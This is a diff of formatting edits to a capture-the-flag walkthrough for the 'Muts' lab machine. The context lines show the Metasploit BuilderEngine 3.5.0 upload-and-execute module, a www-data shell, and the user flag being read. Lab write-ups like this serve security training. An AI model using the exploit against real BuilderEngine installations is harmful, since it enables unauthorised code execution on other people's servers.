@@ -8,6 +8,7 @@ Distributed by FIAP as a weekend challenge.
 
 ### IP Discovery
 
+Static IP Address:
 ```
 10.2.0.11
 ```
@@ -212,7 +213,7 @@ Default 2015 Theme for BuilderEngine V3.
 
 ### Exploiting
 
-BuilderEngine 3.5.0 - Arbitrary File Upload and Execution (https://www.exploit-db.com/exploits/42025)
+BuilderEngine 3.5.0 - Arbitrary File Upload and Execution ( https://www.exploit-db.com/exploits/42025 )
 ```
 msf6 > use exploit/multi/http/builderengine_upload_exec
 
@@ -271,8 +272,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Flag #1 - User
 
+```
 www-data@Muts:/var/www$ cat user.txt
 bfbb7e6e6e88d9ae66848b9aeac6b289
+```
 
 ### Privilege Escalation
 
